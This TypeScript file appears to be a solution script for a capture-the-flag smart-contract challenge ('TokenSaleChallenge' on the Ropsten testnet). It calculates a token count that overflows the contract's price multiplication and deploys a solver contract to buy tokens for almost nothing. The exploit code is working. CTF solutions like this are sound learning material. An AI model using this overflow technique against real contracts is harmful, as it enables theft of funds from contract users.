import { BigNumber } from "@ethersproject/bignumber";
import { MaxUint256, One, WeiPerEther } from "@ethersproject/constants";
import { Contract, ContractFactory } from "@ethersproject/contracts";
import { formatEther } from "@ethersproject/units";

import { artifacts } from "../artifacts";
import { provider, wallets } from "../constants";
import { deployments } from "../deployments";
import { log } from "../utils";

const PRICE_PER_TOKEN = WeiPerEther;

// Convert to hex string & strip from the left down to 64 bytes
const applyOverflow = (n: BigNumber): BigNumber => {
  const hex = n.toHexString().replace(/^0x/, "");
  return BigNumber.from(`0x${hex.length > 64 ? hex.substring(hex.length - 64, hex.length) : hex}`);
};

// Calculate the wei value to send (accounting for unsafe math overflows)
const getTokenSaleValue = (numTokens: string): string =>
  applyOverflow(BigNumber.from(numTokens).mul(PRICE_PER_TOKEN)).toString();

export const tokenSale = async (signer = wallets[0]): Promise<void> => {

  const userAddress = await signer.getAddress();
  log(`User address = ${userAddress}`);
  log(`User balance = ${formatEther(await provider.getBalance(userAddress))}`);

  const challenge = new Contract(
    deployments.ropsten.TokenSaleChallenge.address,
    deployments.ropsten.TokenSaleChallenge.abi,
    provider,
  );

  log(`Preparing to solve challenge at ${challenge.address}`);
  log(`Challenge balance = ${formatEther(await provider.getBalance(challenge.address))}`);
  log(`Challenge complete = ${await challenge.isComplete()}`);

  const factory = new ContractFactory(
    artifacts.TokenSaleSolver.abi,
    artifacts.TokenSaleSolver.bytecode,
    signer,
  );

  const numTokens = MaxUint256.div(WeiPerEther).add(One).toString();

  const value = getTokenSaleValue(numTokens);

  const solver = await factory.deploy(challenge.address, { value });

  await solver.deployTransaction.wait();

  log(`Solver has been deployed to ${solver.address}`);
  log(`Challenge balance = ${formatEther(await provider.getBalance(challenge.address))}`);
  log(`Challenge complete = ${await challenge.isComplete()}`);

};

